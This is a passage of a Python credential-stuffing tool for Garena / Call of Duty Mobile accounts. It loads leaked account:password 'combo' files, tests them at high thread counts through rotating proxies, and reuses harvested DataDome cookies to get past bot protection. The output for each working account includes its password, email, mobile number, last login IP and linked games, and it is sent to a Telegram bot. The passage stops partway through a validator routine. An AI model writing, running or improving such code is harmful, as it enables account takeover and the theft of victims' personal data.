        s.mount("https://", adapter)
        localp.sock = s
    return localp.sock

def discard():
    if hasattr(localp, "sock"):
        try:
            localp.sock.close()
        except Exception:
            pass
        del localp.sock

def herd(urls: list, edge: float = 5.0, hands: int = 500, lead: str = "    ") -> list:
    whole = len(urls)
    workers = min(hands, max(whole, 1))
    alive = []
    dead = []
    waits = []
    bolt = threading.Lock()
    started = time.monotonic()

    meter = Progress(
        SpinnerColumn(),
        TextColumn("[bold bright_cyan]Validating"),
        BarColumn(bar_width=30),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        MofNCompleteColumn(),
        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
        TimeElapsedColumn(),
        TextColumn("ETA"),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=12
    )

    with meter:
        job = meter.add_task(
            "Validating",
            total=whole,
            valid=0,
            invalid=0
        )

        def scan(url: str):
            ok, _, lat = grade(url, edge=edge)
            with bolt:
                if ok:
                    alive.append(url)
                    if lat > 0:
                        waits.append(lat)
                else:
                    dead.append(url)
                meter.update(
                    job,
                    completed=len(alive) + len(dead),
                    valid=len(alive),
                    invalid=len(dead)
                )

        def wrap(url: str):
            try:
                scan(url)
            finally:
                discard()

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(wrap, u) for u in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    discard()

    pace = whole / max(time.monotonic() - started, 0.001)
    console.print(
        f"\n{lead}  [bold green]✔ Valid: {len(alive):,}[/bold green]   "
        f"[bold red]✖ Dead: {len(dead):,}[/bold red]   "
        f"[dim]│  ~{pace:.0f}/s[/dim]"
    )

    mean = (sum(waits) / len(waits)) if waits else -1.0
    rank(len(alive), whole, mean, lead)

    return alive

def rank(alive_count, whole_count, latency_ms, lead="    "):
    if not whole_count:
        return

    rate = (alive_count / whole_count) * 100

    if rate >= 50 and 0 < latency_ms <= 1500:
        band = "HIGH"
        col = "bold bright_green"
        bcol = "bright_green"
        mark = "🟢"
        hint = "up to 20"
        note = "Proxies are fast and reliable. Push thread count high."
    elif rate >= 30 or (0 < latency_ms <= 2500):
        band = "MEDIUM"
        col = "bold yellow"
        bcol = "yellow"
        mark = "🟡"
        hint = "8 – 12"
        note = "Acceptable pool. Balance threads to avoid timeouts."
    else:
        band = "LOW"
        col = "bold red"
        bcol = "red"
        mark = "🔴"
        hint = "3 – 5"
        note = "Pool is weak. Low threads reduce wasted retries."

    lat = f"{latency_ms:.0f} ms" if latency_ms > 0 else "N/A"
    bw = 24

    def stripes(pct, width=bw, color="bright_green"):
        filled = int(pct / 100 * width)
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    def waits(ms, width=bw):
        if ms <= 0:
            return f"[dim]{'░' * width}[/dim]"
        capped = min(ms, 3000)
        filled = int(capped / 3000 * width)
        color = (
            "bright_green" if ms <= 800
            else "yellow" if ms <= 1800
            else "red"
        )
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    lv = (
        "[bright_green]Excellent[/bright_green]"
        if 0 < latency_ms <= 800
        else "[yellow]Acceptable[/yellow]"
        if latency_ms <= 1800
        else "[red]Slow[/red]"
        if latency_ms > 1800
        else "[dim]N/A[/dim]"
    )

    tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    tbl.add_column(style="dim", width=22)
    tbl.add_column(style="white", width=36)

    tbl.add_row("  Quality Tier", f"[{col}]{mark}  {band}[/{col}]")
    tbl.add_row("", "")
    tbl.add_row(
        "  Success Rate",
        f"[bold]{rate:.1f}%[/bold]  "
        f"[dim]({alive_count:,} / {whole_count:,})[/dim]"
    )
    tbl.add_row("", stripes(rate, color=bcol))
    tbl.add_row("", "")
    tbl.add_row("  Avg Latency", f"[bold]{lat}[/bold]  [dim]{lv}[/dim]")
    tbl.add_row("", waits(latency_ms))
    tbl.add_row("", "")
    tbl.add_row(
        "  Rec. Threads",
        f"[bold bright_cyan]{hint}[/bold bright_cyan]"
    )
    tbl.add_row("  Advice", f"[dim]{note}[/dim]")

    console.print()
    console.print(Panel(
        tbl,
        title="[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
        subtitle=f"[{col}] {band} TIER [/{col}]",
        border_style=bcol,
        padding=(1, 2),
        expand=False
    ))
    console.print()

def batch(style='full'):
    global bulk, other, harvest, proxies, relay, hook

    bulk = style
    wipe()
    banner()
    vault = Vault()
    lens = Lens()
    files = vault.scan()

    if not files:
        herald('ERROR', "No combo files found in 'Combo' folder. Add .txt files and retry.")
        input(f'  {dim}Press Enter to return to menu{rst} ')
        return

    infos = [info for fp in files for info in [vault.probe(fp)] if info]
    if not infos:
        herald('ERROR', 'No valid combo files found.')
        input(f'  {dim}Press Enter to return to menu{rst} ')
        return

    lens.board(infos)
    chosen = lens.choose(infos)

    if lens.ask_clean():
        with console.status(
            '[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]',
            spinner='dots'
        ):
            good, bad = vault.cleanse(chosen)
        herald(
            'SUCCESS',
            f'Cleaned: [bold]{good}[/bold] valid, '
            f'[bright_red]{bad}[/bright_red] removed'
        )

    if lens.ask_dedupe():
        with console.status(
            '[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]',
            spinner='dots'
        ):
            removed = vault.dedupe(chosen)
        herald('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')

    auto = lens.ask_auto()
    if auto:
        herald('INFO', '[dim]Auto-remove enabled.[/dim]')

    harvest = True
    herald('SUCCESS', 'Cookie harvesting enabled automatically.', '    ')

    configure()
    relay_ok = (
        relay is not None
        and relay.enabled
        and len(relay.proxies) > 0
    )
    proxies = bool(relay_ok)

    if not relay_ok:
        herald('INFO', '[dim]Running without proxies (direct connection)[/dim]')
    else:
        herald(
            'SUCCESS',
            f'[dim]Proxy enabled — {len(relay.proxies)} proxies loaded[/dim]'
        )

    wipe()
    banner()
    accounts = []
    try:
        with open(chosen, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                account, password = pare(line)
                if account and password:
                    accounts.append(f'{account}:{password}')

        ftbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        ftbl.add_column(style='dim', width=12, no_wrap=True)
        ftbl.add_column(style='bright_white', no_wrap=True)
        ftbl.add_row('File', f'[bright_cyan]{Path(chosen).name}[/bright_cyan]')
        ftbl.add_row(
            'Accounts',
            f'[bold bright_white]{len(accounts):,}[/bold bright_white]'
        )
        console.print(Panel(
            ftbl,
            title='[bold bright_green]✔ FILE LOADED[/bold bright_green]',
            border_style='bright_magenta',
            box=card,
            padding=(0, 2),
            expand=False,
            width=60
        ))
    except Exception as _e:
        herald('ERROR', f'Could not load file: {_e}')
        input(f'  {dim}Press Enter to return to menu{rst} ')
        return

    if not accounts:
        herald('ERROR', 'No valid accounts found in file.')
        print()
        input(f'  {dim}Press Enter to return to menu{rst} ')
        return

    itbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    itbl.add_column(style='dim', width=16, no_wrap=True)
    itbl.add_column(style='bright_white', no_wrap=True)
    itbl.add_row(
        'Total Queued',
        f'[bold bright_white]{len(accounts):,}[/bold bright_white]'
    )
    itbl.add_row('Status', '[bright_green]Ready[/bright_green]')
    console.print(Panel(
        itbl,
        title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]',
        border_style='bright_magenta',
        box=card,
        padding=(0, 2),
        expand=False,
        width=50
    ))

    scribe = Scribe(chosen)
    jar = Jar()
    warden = Warden()
    stats = Ledger()
    stats.total = len(accounts)

    if relay_ok:
        herald('INFO', f'[dim]Using {len(relay.proxies)} proxies[/dim]')
    else:
        herald('INFO', '[dim]Direct connection (no proxies)[/dim]')
    print()

    def _vis(s):
        return len(re.sub(r"\033\[[0-9;]*m", "", s))

    def _box(color, w_):
        top = f"  {color}┏{'━' * (w_ + 2)}┓{rst}"
        div = f"  {color}┣{'━' * (w_ + 2)}┫{rst}"
        bot = f"  {color}┗{'━' * (w_ + 2)}┛{rst}"
        return top, div, bot

    def _line(color, content, w_):
        gap = w_ - _vis(content)
        return (
            f"  {color}┃{rst} {content}"
            f"{' ' * max(gap, 0)} {color}┃{rst}"
        )

    ceiling = 100 if relay_ok else 30

    if relay_ok:
        wid = 56
        top, div, bot = _box(cy, wid)
        print(top)
        print(_line(cy, f"{brt}{wh}⧫  THREAD SELECTOR{rst}", wid))
        print(div)
        print(_line(cy, f"{gn}5–15{rst}    {dim}Safe{rst}  {dim}(recommended){rst}", wid))
        print(_line(cy, f"{yl}17–19{rst}   {dim}Medium speed{rst}", wid))
        print(_line(cy, f"{cy}23–30{rst}  {dim}Fast — proxy only{rst}", wid))
        print(bot)
        print()

        while True:
            try:
                raw = input(
                    f"  {cy}❯{rst} Threads 1-{ceiling} "
                    f"{dim}(default {default}){rst} {cy}❯{rst} "
                ).strip()
                hands = default if not raw else int(raw)
                if 1 <= hands <= ceiling:
                    break
                herald("ERROR", f"Enter a value between 1 and {ceiling}.")
            except ValueError:
                herald("ERROR", "Invalid input — enter a number.")

        herald("SUCCESS", f"Running with {brt}{hands}{rst} thread(s)")
        print()
    else:
        hands = 30
        wid = 60
        top, div, bot = _box(yl, wid)
        print(top)
        print(_line(yl, f"{brt}{wh}⚠  NO PROXY DETECTED{rst}", wid))
        print(div)
        print(_line(
            yl,
            f" {dim}Auto-locking to {rst}{brt}{gn}30 THREADS{rst}"
            f"{dim} for stable checking.{rst}",
            wid
        ))
        print(_line(
            yl,
            f" {dim}Direct IP is prone to rate limits and bans.{rst}",
            wid
        ))
        print(_line(
            yl,
            f" {dim}To unlock 100 threads, configure a proxy pool.{rst}",
            wid
        ))
        print(bot)
        print()
        herald(
            "SUCCESS",
            f"Running with {brt}{hands}{rst} thread(s) {dim}(Direct IP){rst}"
        )
        print()

    wid_g = 60
    top_g, div_g, bot_g = _box(mg, wid_g)
    print(top_g)
    print(_line(mg, f"{brt}{wh}◇  GAME CONNECTIONS{rst}", wid_g))
    print(div_g)
    print(_line(
        mg,
        f"{wh}Check OTHER GAMES{rst}  {dim}(AOV / ROV / FF / Delta Force…){rst}",
        wid_g
    ))
    print(_line(
        mg,
        f"{dim}Saves each game to separate file  ·  Adds ~1-3s per account{rst}",
        wid_g
    ))
    print(bot_g)
    print()

    other = input(
        f"  {mg}◇{rst}  Check other games? (y/N) {cy}❯{rst} "
    ).strip().lower() == "y"
    if other:
        herald("SUCCESS", "Will scan all Garena game connections")
    else:
        herald("INFO", f"{dim}CODM only — skipping other game checks{rst}")
    print()

    cfgfile = os.path.join(scrpath, '.tg_cfg')

    def _save(token, chat, mode, clean_range, nc_range):
        try:
            with open(cfgfile, 'w', encoding='utf-8') as f:
                json.dump({
                    'token': token,
                    'chat_id': chat,
                    'mode': mode,
                    'clean': clean_range,
                    'nc': nc_range
                }, f)
        except Exception:
            pass

    def _load():
        try:
            if not os.path.exists(cfgfile):
                return None
            with open(cfgfile, 'r', encoding='utf-8') as f:
                d = json.load(f)
            if d.get('token') and d.get('chat_id'):
                return d
            return None
        except Exception:
            return None

    saved = _load()
    wid_t = 56
    top_t, div_t, bot_t = _box(yl, wid_t)
    print(top_t)
    print(_line(yl, f"{brt}{wh}⬡  TELEGRAM NOTIFICATION SETUP{rst}", wid_t))
    print(div_t)
    print(_line(yl, f"{wh}1{rst}  {yl}›{rst}  {dim}Send Clean hits only{rst}", wid_t))
    print(_line(yl, f"{wh}2{rst}  {yl}›{rst}  {dim}Send Not-Clean hits only{rst}", wid_t))
    print(_line(yl, f"{wh}3{rst}  {yl}›{rst}  {dim}Send Both (clean + not-clean){rst}", wid_t))
    print(_line(yl, f"{wh}4{rst}  {dim}›  No Telegram (skip){rst}", wid_t))
    print(bot_t)
    print()

    tg_pick = ''
    while tg_pick not in ('1', '2', '3', '4'):
        tg_pick = input(f'  {yl}❯{rst} ').strip()

    tg_on = tg_pick != '4'
    tg_clean = tg_pick in ('1', '3')
    tg_nc = tg_pick in ('2', '3')
    bot_token = ''
    chat_id = ''
    lmin_c = lmax_c = 0
    lmin_n = lmax_n = 0
    lmax_c = lmax_n = 9999

    if tg_on:
        print()
        if saved:
            wid_s = 56
            top_s, div_s, bot_s = _box(gn, wid_s)
            print(top_s)
            print(_line(gn, f"{brt}{wh}✔  Saved config found{rst}", wid_s))
            print(div_s)
            print(_line(gn, f"{dim}Token: {saved['token']}{rst}", wid_s))
            print(_line(gn, f"{dim}Chat ID: {saved['chat_id']}{rst}", wid_s))
            print(bot_s)
            print()
            if input(
                f'  {yl}❯ Use saved config? (y/n){rst}  {yl}❯{rst} '
            ).strip().lower() == 'y':
                bot_token = saved['token']
                chat_id = saved['chat_id']
                _cr = saved.get('clean', [0, 9999])
                _nr = saved.get('nc', [0, 9999])
                lmin_c, lmax_c = (_cr[0], _cr[1]) if tg_clean else (0, 9999)
                lmin_n, lmax_n = (_nr[0], _nr[1]) if tg_nc else (0, 9999)
                wid_ok = 56
                top_ok, _, bot_ok = _box(gn, wid_ok)
                print(top_ok)
                print(_line(gn, f"{brt}{wh}✔  Using saved config{rst}", wid_ok))
                print(bot_ok)
                print()
            else:
                saved = None

        if not saved:
            wid_i = 56
            top_i, _, bot_i = _box(yl, wid_i)
            print(top_i)
            print(_line(yl, f"{brt}{wh}Enter Telegram Credentials{rst}", wid_i))
            print(bot_i)
            print()
            bot_token = input(f'  {yl}❯ Bot Token{rst}  {yl}❯{rst} ').strip()
            chat_id = input(f'  {yl}❯ Chat ID{rst}  {yl}❯{rst} ').strip()

            if tg_clean:
                print()
                print(
                    f'  {dim}Level range for {gn}CLEAN{rst}'
                    f'{dim} hits — format: min-max (e.g. 50-400){rst}'
                )
                raw_c = input(
                    f'  {gn}❯ Clean level range (Enter = all){rst}  '
                    f'{gn}❯{rst} '
                ).strip()
                if raw_c and '-' in raw_c:
                    try:
                        parts = raw_c.split('-')
                        lmin_c = int(parts[0].strip())
                        lmax_c = int(parts[1].strip())
                    except Exception:
                        pass

            if tg_nc:
                print()
                print(
                    f'  {dim}Level range for {rd}NOT-CLEAN{rst}'
                    f'{dim} hits — format: min-max (e.g. 1-200){rst}'
                )
                raw_n = input(
                    f'  {rd}❯ Not-clean level range (Enter = all){rst}  '
                    f'{rd}❯{rst} '
                ).strip()
                if raw_n and '-' in raw_n:
                    try:
                        parts = raw_n.split('-')
                        lmin_n = int(parts[0].strip())
                        lmax_n = int(parts[1].strip())
                    except Exception:
                        pass

            if bot_token and chat_id:
                _save(
                    bot_token,
                    chat_id,
                    tg_pick,
                    [lmin_c, lmax_c],
                    [lmin_n, lmax_n]
                )
                print(f'  {dim}Config saved for next time.{rst}')

        print()
        print(f'  {gn}✔  Telegram configured.{rst}')
        if tg_clean:
            print(f'  {dim}Clean hits  : Level {gn}{lmin_c}–{lmax_c}{rst}')
        if tg_nc:
            print(f'  {dim}Not-clean   : Level {rd}{lmin_n}–{lmax_n}{rst}')
        print()

    def _send(token, chat, text, silent=False):
        try:
            html = f'<pre><code>{text}</code></pre>'
            payload = {
                'chat_id': chat,
                'text': html,
                'parse_mode': 'HTML',
                'disable_notification': silent
            }
            requests.post(
                f'https://api.telegram.org/bot{token}/sendMessage',
                json=payload,
                timeout=8
            )
        except Exception:
            pass

    def _build(acc, pwd, ad, clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        fb_user = ad.get('fb_username', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        login_ip = ad.get('last_login_ip', 'N/A')
        login_c = ad.get('last_login_country', 'N/A')
        username = ad.get('username', 'N/A')
        bind = ad.get('bind_status', 'N/A')
        gcs = ad.get('game_connections', [])

        status_text = 'CLEAN' if clean_hit else 'NOT CLEAN'
        checked_time = ad.get('checked_time', datetime.now().strftime('%B %d, %Y | %I:%M %p'))

        if fb != 'NOT CONNECTED' and not fb:
            fb = 'CONNECTED'

        lines = [
            '[  ᴄᴏᴅᴍ ʜɪᴛ  ]',
            '━━ .✦·········━━━━',
            f'✦ ꜱᴛᴀᴛᴜꜱ › {status_text}',
            f'✦ ʟᴇᴠᴇʟ  › {lvl}',
            f'✦ ꜱʜᴇʟʟꜱ › {shell:,}',
            '━━ .✦·········━━━━',
            f'✦ ʟᴏɢɪɴ  › {acc}',
            f'✦ ᴘᴀꜱꜱ   › {pwd}',
            '━━ .✦·········━━━━',
            f'✦ ɴɪᴄᴋ   › {nick}',
            f'✦ ᴜɪᴅ    › {uid}',
            f'✦ ʀᴇɢɪᴏɴ › {region}',
            '━━ .✦·········━━━━',
            f'✦ ᴜꜱᴇʀ   › {username}',
            f'✦ ᴇᴍᴀɪʟ  › {email_d}',
            f'✦ ᴍᴏʙɪʟᴇ › {mobile}',
            f'✦ ꜰᴀᴄᴇʙᴏᴏᴋ › {fb}',
            f'✦ ꜰʙ ɴᴀᴍᴇ › {fb_user}'
        ]
        if fb_link != 'N/A':
            lines.append(f'✦ ꜰʙ ʟɪɴᴋ › {fb_link}')

        lines.extend([
            '━━ .✦·········━━━━',
            f'✦ ʙɪɴᴅ   › {bind}',
            f'✦ ᴄᴏᴜɴᴛʀʏ › {country}',
            '━━ .✦·········━━━━',
            f'✦ ʟᴀꜱᴛ ʟᴏɢɪɴ › {login_d}',
            f'✦ ʟᴏɢɪɴ ᴠɪᴀ  › {login_w}',
            f'✦ ʟᴏɢɪɴ ɪᴘ   › {login_ip}',
            f'✦ ʟᴏɢɪɴ ʟᴏᴄ  › {login_c}'
        ])

        if gcs and other:
            lines.append('━━ .✦·········━━━━')
            lines.append('✦ ɢᴀᴍᴇꜱ ›')
            for g in gcs:
                gname = g.get('game', 'Unknown')
                role = g.get('role', 'N/A')
                reg = g.get('region', '')
                if reg:
                    lines.append(f'  • {gname}: {role} ({reg})')
                else:
                    lines.append(f'  • {gname}: {role}')

        lines.extend([
            '━━ .✦·········━━━━',
            f'✦ ᴛɪᴍᴇ   › {checked_time}',
            '✦ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @rriellqt'
        ])
        return '\n'.join(lines)

    def _maybe(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build(acc, pwd, account_data, is_clean)
        if tg_on:
            if is_clean and tg_clean and (lmin_c <= lvl <= lmax_c):
                threading.Thread(
                    target=_send,
                    args=(bot_token, chat_id, msg, False),
                    daemon=True
                ).start()
            elif (
                not is_clean
                and tg_nc
                and (lmin_n <= lvl <= lmax_n)
            ):
                threading.Thread(
                    target=_send,
                    args=(bot_token, chat_id, msg, False),
                    daemon=True
                ).start()

    hook = _maybe

    wipe()
    deck = Deck(len(accounts), max_threads=hands)
    deck.proxy_mode = relay_ok
    globals()['_dashboard_ref'] = deck
    deck.start()

    overall = 0
    counter = [0]
    idxlock = threading.Lock()
    statlock = threading.Lock()

    global ipsilent, ipcallback
    ipsilent = True

    def _ip_cb(blocked):
        try:
            deck.set_ip_blocked(blocked)
        except Exception:
            pass

    ipcallback = _ip_cb
    threadlocal = threading.local()

    def _resources():
        if not hasattr(threadlocal, 'session') or not hasattr(threadlocal, 'datadome'):
            threadlocal.session = forge()
            threadlocal.datadome = Warden()
            threadlocal.proxy_url = None
            threadlocal.proxy_line = None
            if relay_ok and relay and relay.enabled:
                p = relay.next()
                if p:
                    threadlocal.session.proxies.update(p)
                    threadlocal.proxy_url = p.get('http') or p.get('https')
                    threadlocal.proxy_line = relay._index
                    deck.set_current_proxy(
                        proxy=threadlocal.proxy_url,
                        line=threadlocal.proxy_line
                    )
            proxy_dict = (
                dict(threadlocal.session.proxies)
                if relay_ok and relay and relay.enabled
                else None
            )
            saved_ck = jar.pick()
            if saved_ck:
                instill(threadlocal.session, saved_ck)
                dd = pluck(saved_ck)
                if dd:
                    threadlocal.datadome.set_datadome(dd)
                    threadlocal.datadome.set_session_datadome(
                        threadlocal.session, dd
                    )
            else:
                dd = garner(threadlocal.session, proxies_arg=proxy_dict)
                if dd:
                    threadlocal.datadome.set_datadome(dd)
                    threadlocal.datadome.set_session_datadome(
                        threadlocal.session, dd
                    )
        return (threadlocal.session, threadlocal.datadome)

    def _worker(line):
        if ':' not in line:
            return ('DONE', line, {})
        try:
            account, password = line.split(':', 1)
            account, password = account.strip(), password.strip()
            session, wdm = _resources()
            quiet = (bulk != 'full')
            status = process(
                session, account, password, jar, wdm,
                stats, scribe, vault, chosen, auto,
                suppress_print=quiet,
                proxy_manager=relay if relay_ok else None
            )
            return (status, account, {})
        except Exception:
            return ('ERROR', line, {})

    def _wrapped(line):
        nonlocal overall
        with idxlock:
            counter[0] += 1
            my_idx = counter[0]
        name = line.split(':', 1)[0].strip() if ':' in line else line
        try:
            deck.record_start(my_idx, name)
        except Exception:
            pass

        while True:
            status, name, _ = _worker(line)
            if status == 'IP_CHANGED':
                if hasattr(threadlocal, 'session'):
                    try:
                        threadlocal.session.close()
                    except Exception:
                        pass
                    del threadlocal.session
                if hasattr(threadlocal, 'datadome'):
                    del threadlocal.datadome
                if relay_ok and relay and relay.enabled:
                    p = relay.next()
                    if p:
                        purl = p.get('http') or p.get('https')
                        pline = relay._index
                        deck.set_current_proxy(proxy=purl, line=pline)
                time.sleep(2)
                continue
            break

        info = stats.pop()
        if info and info['success']:
            shell_b = info.get('shell_balance', 0)
            deck.record(
                my_idx, name,
                success=True,
                is_clean=info['is_clean'],
                has_codm=info['has_codm'],
                codm_level=info['codm_level'],
                shell_balance=shell_b
            )
        else:
            reason = (info or {}).get('error_reason', 'Invalid')
            deck.record(
                my_idx, name,
                success=False,
                error_reason=reason
            )

        with statlock:
            overall += 1

    try:
        with ThreadPoolExecutor(max_workers=hands) as executor:
            futures = {executor.submit(_wrapped, ln): ln for ln in accounts}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    with statlock:
                        overall += 1
    except KeyboardInterrupt:
        herald('WARNING', 'Interrupted — shutting down...')
    finally:
        deck.stop()

    ipsilent = False
    ipcallback = None
    print()
    stats.finish()
    flush(vault, chosen, force=True)
    print(f'  {dim}Results saved in real-time to Results/{rst}')
    print()
    input(f'  {dim}Press Enter to return to menu{rst} ')

def solo():
    global other, proxies, relay, ipsilent

    wipe()
    banner()
    jar = Jar()
    warden = Warden()
    proxies = False
    relay = None

    console.print(Panel(
        Text("SINGLE CHECK", style="bold bright_white"),
        border_style="bright_magenta",
        box=box.ROUNDED,
        expand=False
    ))
    print()

    while True:
        other = input(
            f'  {cy}◇{rst}  Check game connections? (y/N) {cy}❯{rst} '
        ).strip().lower() == "y"

        if other:
            herald('INFO', '[dim]Will scan all Garena game connections[/dim]')
        else:
            herald('INFO', '[dim]CODM only — skipping other game checks[/dim]')

        print()

        stats = Ledger()
        stats.total = 1

        session = forge()
        jar = Jar()
        warden = Warden()

        saved_ck = jar.pick()
        if saved_ck:
            instill(session, saved_ck)
            dd = pluck(saved_ck)
            if dd:
                warden.set_datadome(dd)
                warden.set_session_datadome(session, dd)
        else:
            proxy_dict = (
                dict(session.proxies)
                if hasattr(session, 'proxies') and session.proxies
                else None
            )
            dd = garner(session, proxies_arg=proxy_dict)
            if dd:
                warden.set_datadome(dd)
                warden.set_session_datadome(session, dd)

        account = input(
            f'  {cy}❯ Username/Email{rst}  {cy}❯{rst} '
        ).strip()
        if not account:
            herald('ERROR', 'Username/Email cannot be empty.')
            print()
            continue

        password = input(
            f'  {cy}❯ Password{rst}  {cy}❯{rst} '
        ).strip()
        if not password:
            herald('ERROR', 'Password cannot be empty.')
            print()
            continue

        stamp_v = datetime.now().strftime('%Y%m%d_%H%M%S')
        scribe = Scribe(combo_file_path=Path('SingleCheck'), create_dirs=False)
        scribe.base_dir = Path(f'Single Check Output/{stamp_v}')

        if other:
            (scribe.base_dir / 'Games').mkdir(parents=True, exist_ok=True)

        herald(
            'INFO',
            f'[dim]Checking: [bold bright_cyan]{account}[/bold bright_cyan]…[/dim]'
        )
        print()

        process(
            session,
            account,
            password,
            jar,
            warden,
            stats,
            scribe,
            vault=None,
            combo_file_path=None,
            auto_remove=False,
            use_elegant_display=True,
            suppress_print=False
        )

        console.print(Panel(
            Text("SAVE RESULT?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="bright_yellow",
            box=box.ROUNDED,
            expand=False
        ))
        save_resp = input(f'\n  {yl}❯{rst} ').strip().lower()

        if save_resp == 'y':
            for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
                (scribe.base_dir / sub).mkdir(parents=True, exist_ok=True)
            herald(
                'SAVE',
                f'Saved to [bright_cyan]{scribe.base_dir}[/bright_cyan]'
            )
        else:
            herald('INFO', '[dim]Result discarded — not saved.[/dim]')

        console.print(Panel(
            Text("CHECK ANOTHER?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        ))
        again = input(f'\n  {mg}❯{rst} ').strip().lower()

        if again != 'y':
            break

        session.close()
        herald('INFO', '[dim]↺  Refreshing session for next check…[/dim]')
        time.sleep(1)
        wipe()
        banner()
        console.print(Panel(
            Text("SINGLE ACCOUNT CHECK", style="bold bright_white"),
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        ))
        print()

def audit():
    wipe()
    banner()
    console.print(Panel(
        Text("⚠  SECURITY NOTICE", style="bold bright_red")
        + Text(" — USE A VPN BEFORE VALIDATING", style="bright_white"),
        border_style="bright_red",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    console.print(Panel(
        Text("⬡  VALIDATOR MODE", style="bold bright_white"),
        border_style="bright_yellow",
        box=box.ROUNDED,
        expand=False
    ))
    print()

    vault = Vault()
    files = vault.scan()
    if not files:
        herald('ERROR', 'No .txt files found in Combo folder.')
        input(f'\n  {dim}Press Enter to return to menu{rst} ')
        return

    lens = Lens()
    infos = [info for fp in files for info in [vault.probe(fp)] if info]
    if not infos:
        herald('ERROR', 'No valid combo files.')
        input(f'\n  {dim}Press Enter to return to menu{rst} ')
        return

    lens.board(infos)
    chosen = lens.choose(infos)

    accounts = []
    with open(chosen, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            acc, pw = pare(line)
            if acc and pw:
                accounts.append((acc, pw))

    if not accounts:
        herald('ERROR', 'No valid account:password lines found.')
        input(f'\n  {dim}Press Enter to return to menu{rst} ')
        return

    console.print(Panel(
        Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"),
        border_style="bright_green",
        box=box.ROUNDED,
        expand=False
    ))
    print()

    console.print(Panel(
        Text("Select Thread Count", style="bold bright_white"),
        border_style="bright_cyan",
        box=box.ROUNDED,
        expand=False
    ))

    while True:
        try:
            raw_t = input(
                f'  {cy}❯ Threads 1-20 {dim}(default {default}){rst}  '
                f'{cy}❯{rst} '
            ).strip()
            hands = int(raw_t) if raw_t else default
            if 1 <= hands <= 20:
                break
            herald('ERROR', 'Enter a value between 1 and 20.')
        except ValueError:
            herald('ERROR', 'Invalid input — enter a number.')

    herald('SUCCESS', f'Running with [bold]{hands}[/bold] thread(s)')
    print()

    stem = Path(chosen).stem
    stamp_v = datetime.now().strftime('%Y%m%d_%H%M%S')
    outdir = Path('Results') / f'validator_{stem}_{stamp_v}'
    outdir.mkdir(parents=True, exist_ok=True)

    good_path = outdir / 'valid.txt'
    bad_path = outdir / 'invalid.txt'
    err_path = outdir / 'errors.txt'

    good_fh = open(good_path, 'a', encoding='utf-8', buffering=1)
    bad_fh = open(bad_path, 'a', encoding='utf-8', buffering=1)
    err_fh = open(err_path, 'a', encoding='utf-8', buffering=1)

    v = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
    stlock = threading.Lock()
    flock = threading.Lock()
    stopev = threading.Event()
    plock = threading.Lock()
    started = time.time()
    total = len(accounts)
    jar_v = Jar()
    tloc = threading.local()

    def _sess():
        if not hasattr(tloc, 's'):
            s = forge()
            dm = Warden()
            saved = jar_v.pick()
            if saved:
                instill(s, saved)
                dd = pluck(saved)
                if dd:
                    dm.set_datadome(dd)
                    dm.set_session_datadome(s, dd)
            else:
                pdict = (
                    dict(s.proxies)
                    if hasattr(s, 'proxies') and s.proxies
                    else None
                )
                dd = garner(s, proxies_arg=pdict)
                if dd:
                    dm.set_datadome(dd)
                    dm.set_session_datadome(s, dd)
            tloc.s = s
            tloc.dm = dm
        return (tloc.s, tloc.dm)

    def _line(tag, account, password, note=''):
        with plock:
            if tag == 'valid':
                console.print(
                    f"  [bold bright_green]VALID  [/bold bright_green]  "
                    f"[bright_white]{account}:{password}[/bright_white]"
                )
            else:
                reason = (
                    note.upper()
                    if note
                    else 'INCORRECT PASSWORD'
                    if tag == 'invalid'
                    else 'UNKNOWN ERROR'
                )
                color = "bold bright_red" if tag == 'invalid' else "dim"
                console.print(
                    f"  [{color}]INVALID[/{color}]  "
                    f"[dim]{account}:{password}[/dim]  "
                    f"[dim]{reason}[/dim]"
                )

    def _stats_line():
        with stlock:
            vv = v['valid']
            iv = v['invalid']
            er = v['error']
            dn = v['done']
        elapsed = max(time.time() - started, 0.001)
        rate = dn / elapsed
        eta = (total - dn) / rate if rate > 0 else 0
        pct = dn / total * 100 if total > 0 else 0
        bw = 20
        filled = int(pct / 100 * bw)
        with plock:
            console.print()
